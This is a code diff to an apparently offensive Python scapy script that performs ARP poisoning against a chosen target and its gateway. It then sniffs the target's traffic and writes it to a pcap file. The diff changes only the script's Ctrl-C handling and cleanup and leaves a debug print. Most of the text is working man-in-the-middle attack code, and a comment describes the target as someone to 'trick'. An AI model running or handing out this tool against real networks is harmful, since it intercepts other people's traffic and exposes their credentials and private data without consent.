@@ -1,6 +1,19 @@
 from scapy.all import *
 import os, sys, signal, threading
 
+
+def signalHandler(signal, frame):
+    global gateway_ip
+    global gateway_mac
+    global target_ip
+    global target_mac
+    restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    print("[*] exit stop")
+    sys.exit(1)
+
+# register signal handler
+signal.signal(signal.SIGINT, signalHandler)
+
 try:
     interface = sys.argv[1]
     target_ip = sys.argv[2] #who i wanna trick
@@ -62,33 +75,30 @@ def get_mac_(ip_address):
 
 
 def start_sniffing(interface, gateway_ip, gateway_mac, target_ip,target_mac, filter=None, packet_count=1000):
+    # register signal handler
+    signal.signal(signal.SIGINT, signalHandler)
     print("[*] Starting sniffer on %s for %d packets" % (interface, packet_count))
     if filter:
-        try:
-            packets = sniff(filter=filter, count=packet_count,iface=interface, prn = lambda x: x.show())
-            wrpcap('arper.pcap',packets)
-            return
-        except KeyboardInterrupt:
-            #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-            return
+        packets = sniff(filter=filter, count=packet_count,iface=interface, prn = lambda x: x.show())
+        wrpcap('arper.pcap',packets)
+        return
     else:
-        try:
-            packets = sniff(filter="ip host %s" % target_ip, count=packet_count,iface=interface, prn = lambda x: x.show())
-            wrpcap('arper.pcap',packets)
-            return
-        except KeyboardInterrupt:
-            #restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-            return
+        print(22)
+        packets = sniff(filter="ip host %s" % target_ip, count=packet_count, iface=interface, prn = lambda x: x.show())
+        wrpcap('arper.pcap',packets)
+        return
     
 
 def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,event):
-    #spoof = ARP()
+    # register signal handler
+    signal.signal(signal.SIGINT, signalHandler)
+    
     poison_target = ARP()
     poison_target.op = 2
     poison_target.psrc = gateway_ip
     poison_target.pdst = target_ip
     poison_target.hwdst= target_mac
-    #poison_target.show()
+
     poison_gateway = ARP()
     poison_gateway.op = 2
     poison_gateway.psrc = target_ip
@@ -96,14 +106,14 @@ def poison_target(gateway_ip,gateway_mac,target_ip,target_mac,event):
     poison_gateway.hwdst= gateway_mac
     print("[*] Beginning the ARP poison. [CTRL-C to stop]")
     while event.is_set():
-        try:
-            send(poison_target)
-            send(poison_gateway)
-            time.sleep(1)
-        except KeyboardInterrupt:
-            print("[*] poison stop")
-            restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
-            return
+        send(poison_target)
+        send(poison_gateway)
+        time.sleep(1)
+
+    #    except KeyboardInterrupt:
+    #        print("[*] poison stop")
+    #        restore_target(gateway_ip,gateway_mac,target_ip,target_mac)
+    #        return
         
     print("[*] ARP poison attack finished.")
     return
